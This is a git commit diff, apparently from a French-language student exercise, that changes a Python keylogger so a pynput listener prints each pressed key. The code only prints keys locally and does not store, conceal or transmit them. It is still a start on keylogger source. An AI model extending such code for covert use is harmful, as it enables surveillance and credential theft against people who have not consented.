822f303b317eae23ef7dfbb9cc5db1f97b28cf51
Sharper8 <8sharper8@proton.me>
2025-11-10 12:37:10 +0100

    added On press (question 6.2)

--- keylogger.py
+++ keylogger.py
@@ -2,18 +2,26 @@ import pynput
 import pynput.keyboard
 
 
-#Créer la méthode processkeys(key)qui prend comme paramètre une touche du clavier sur laquelle  on a appuyé, affiche sa valeur.
+# Créer la méthode processkeys(key) qui prend comme paramètre une touche du clavier sur laquelle on a appuyé, affiche sa valeur.
 def processkeys(key):
     try:
         print(f'Touche appuyée: {key.char}')
     except AttributeError:
         print(f'Touche spéciale appuyée: {key}')
 
-#Créer un écouteur de clavier qui utilise la méthode processkeys(key) pour traiter les touches appuyées.
+
+# 6.1. Déclarez une variable keyboard_listener qui va contenir le résultat de l'appel de la fonction pynput.keyboard.Listener()
+keyboard_listener = pynput.keyboard.Listener(on_press=processkeys)
+
+
+# Créer la méthode start_keylogger() qui démarre l'écouteur de clavier.
 def start_keylogger():
-    with pynput.keyboard.Listener(on_press=processkeys) as listener:
-        listener.join()
+    # Démarre l'écouteur en arrière-plan
+    keyboard_listener.start()
+    # Attend que l'écouteur se termine (bloque le programme)
+    keyboard_listener.join()
+
+
 if __name__ == "__main__":
     start_keylogger()
-#Créer la méthode start_keylogger() qui démarre l'écouteur de clavier.
 
